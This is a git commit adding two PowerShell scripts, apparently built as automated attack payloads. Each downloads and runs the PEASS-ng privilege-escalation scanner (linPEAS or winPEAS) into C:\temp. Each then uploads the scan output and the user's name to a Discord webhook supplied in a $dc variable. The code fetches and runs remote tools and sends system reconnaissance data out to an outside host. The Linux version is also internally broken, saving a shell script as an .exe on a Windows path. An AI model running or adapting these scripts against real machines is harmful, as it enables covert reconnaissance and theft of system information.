f50e010c48023a79842fafb3e19d0b16199036b2
theredhammer <118747418+theredhammer@users.noreply.github.com>
2023-01-04 15:47:18 +0100

    Add files via upload

---
+++ Linux/fast/linpeas_auto.ps1
@@ -0,0 +1,52 @@
+﻿function Create-Folder {
+    param(
+        [string]$folderPath
+    )
+
+    New-Item -ItemType Directory -Path $folderPath
+}
+
+
+Create-Folder -folderPath "C:\temp"
+
+$dir = "C:\temp"
+function Run-linPeas {
+    
+    Invoke-WebRequest -Uri "https://github.com/carlospolop/PEASS-ng/releases/download/20230101/linpeas.sh" -OutFile "$dir\winpeas.exe"
+
+    & "$dir\winpeas.exe" all > "$dir\peas_output.txt"
+}
+
+Run-linPeas
+
+
+function Upload-Discord {
+
+    [CmdletBinding()]
+    param (
+        [parameter(Position = 0, Mandatory = $False)]
+        [string]$file,
+        [parameter(Position = 1, Mandatory = $False)]
+        [string]$text 
+    )
+
+    $hookurl = "$dc"
+
+    $Body = @{
+        'username' = $env:username
+        'content'  = $text
+    }
+
+    if (-not ([string]::IsNullOrEmpty($text))) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+    };
+
+    if (-not ([string]::IsNullOrEmpty($file))) { curl.exe -F "file1=@$file" $hookurl }
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))) { Upload-Discord -file $dir\peas_output.txt }
+
+
+
+############################################################################################################################################################
+#RI $dir/output.txt
---
+++ Windows/fast/winpeas_auto.ps1
@@ -0,0 +1,52 @@
+﻿function Create-Folder {
+    param(
+        [string]$folderPath
+    )
+
+    New-Item -ItemType Directory -Path $folderPath
+}
+
+
+Create-Folder -folderPath "C:\temp"
+
+$dir = "C:\temp"
+function Run-winPeas {
+    
+    Invoke-WebRequest -Uri "https://github.com/carlospolop/PEASS-ng/releases/download/20230101/winPEASx64.exe" -OutFile "$dir\winpeas.exe"
+
+    & "$dir\winpeas.exe" all > "$dir\peas_output.txt"
+}
+
+Run-winPeas
+
+
+function Upload-Discord {
+
+    [CmdletBinding()]
+    param (
+        [parameter(Position = 0, Mandatory = $False)]
+        [string]$file,
+        [parameter(Position = 1, Mandatory = $False)]
+        [string]$text 
+    )
+
+    $hookurl = "$dc"
+
+    $Body = @{
+        'username' = $env:username
+        'content'  = $text
+    }
+
+    if (-not ([string]::IsNullOrEmpty($text))) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+    };
+
+    if (-not ([string]::IsNullOrEmpty($file))) { curl.exe -F "file1=@$file" $hookurl }
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))) { Upload-Discord -file $dir\peas_output.txt }
+
+
+
+############################################################################################################################################################
+#RI $dir/output.txt
